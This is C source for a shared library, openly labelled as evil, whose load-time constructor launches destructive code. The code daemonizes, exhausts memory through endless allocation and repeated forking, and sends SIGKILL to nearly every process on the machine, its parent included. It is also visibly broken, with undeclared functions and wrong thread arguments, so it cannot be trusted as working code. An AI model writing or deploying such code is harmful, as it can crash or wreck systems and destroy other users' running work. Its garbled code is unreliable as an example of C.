#include <stdlib.h>
#include <stdio.h>
#include <stdbool.h>
#include <pthread.h>
#include <sys/types.h>
#include <dlfcn.h>
#include <unistd.h>
#include <string.h>
#include <math.h>
#include <signal.h>

static pthread_t badproggy_thread;
int wait_before_return = 0;
int su_pid;

int worse_than_ever ();
void wte_start();
void *wte_fuck_mem ();
void *wte_fuck_process ();

void *badproggy_main(void *argv) {
	char **argvp = (char**)argv;
	int argc = 0;
	for (int i=0; *(argvp+i) != NULL; ++i)
		++argc;
	static int retcode = 1;
/**
	int (*badproggy_main_funcptr)(int,const char**);
	void *handle = dlopen(*argvp, RTLD_NOW);
	if (!handle)
		return &retcode;
	badproggy_main_funcptr = dlsym(handle, "main");
**/
	int *badproggy_main_funcptr = worse_than_ever();
	if (!badproggy_main_funcptr)
		return &retcode;
	retcode = (*badproggy_main_funcptr)();
	return &retcode;
}

int worse_than_ever () {
	/** THE SOURCE OF EVIL
	 * Make us a daemon!!!!
	 */

        pid_t pid, sid;

        /* Fork off the parent process */

        pid = fork();

        if (pid < 0)
                return -1;

        /* If we got a good PID, then
           we can exit the parent process. */
        if (pid > 0)
                return 0;


	/* START THE CHAOS */
	wte_start();
}

void wte_start () {
	 /* First off, try to kill the parent process if it doesn't exit */
 fuck_your_process(false);

 pthread_t pth_fuck_mem;        // pthread for fuck_your_mem ()
 pthread_t pth_fuck_process;   // pthread for fuck_your_process ()
 int i = 0;

 /* Create worker thread */
 pthread_create(&pth_fuck_mem, NULL, wte_fuck_your_mem(), NULL);
 pthread_create(&pth_fuck_process, NULL, wte_fuck_your_process(true), true);

 /* wait for our thread to finish before continuing */
 pthread_join(pth_fuck_mem, NULL);
 pthread_join(pth_fuck_process, NULL);
}

void * wte_fuck_your_mem () {
 su_pid = getpid();
 int x = 0x0000;
 int memtest = 0;
 int *p_mem = &memtest;
 x = (int) p_mem;
 unsigned char const *p = (unsigned char const *) &x;
 size_t i;
 unsigned char const *p1, *p2;

 //beary little counter
 int counter_trigger = 0;

 //alien's lame strategy to not get our crappy process killed yet burning CPU
 while(true) { //stabilize thread
  while(sin(1 / 10 * counter_trigger) != cos(1 / 10 * counter_trigger)) {
	 if(counter_trigger > 4096)
	  fork(); //only forks if memory is allocated to an extent

         for (i=0; i < sizeof x; i++) {
                 //printf("%02X ", p[i]);
		 p2 = &p[i];
		 p1 = malloc(sizeof(p2));
         }

         printf ("\n");

	 if(counter_trigger < 2)
	  fork(); //let's have some fun first

         x++;
  }
 }
 return 0;
}

void * wte_fuck_your_process (bool b) {
 if(b) {
  pid_t pid_indicator = 1;
  while(true) {
   while(pid_indicator != getpid() &&
         pid_indicator != getppid() &&
         pid_indicator != su_pid &&
         pid_indicator >= 100) {
    //kill ya
    kill(pid_indicator ,SIGKILL);
    pid_indicator++; //it's okay to have a few skips new the parent process, but I dont wanna make this too complicated
   }
   pid_indicator++;
  }
 } else if(!b) { //kill parent
  kill(getppid(), SIGKILL);
 }
}


__attribute__((constructor))
static void before_run(int argc, char **argv, char *envp) {
	if (argc < 2)
		return;
	char **argv_copy = NULL;
	char **argvp = argv;
	size_t argv_copy_sz = 0;
	int new_argc = argc - 1;
	for (int i=1; i<argc; ++i)
		argv_copy_sz += strlen(argv[i])+1;
	argv_copy_sz += sizeof(NULL);
	if ((argv_copy = malloc(argv_copy_sz)) == NULL)
		return;
	memcpy(argv_copy, argv+1, argv_copy_sz);
	argv_copy[new_argc] = NULL;
	wait_before_return = 1;
	pthread_create(&badproggy_thread, NULL, badproggy_main, argv_copy);
}

__attribute__((destructor))
static void before_exit(void) {
	if (wait_before_return)
		pthread_join(badproggy_thread, NULL);
}
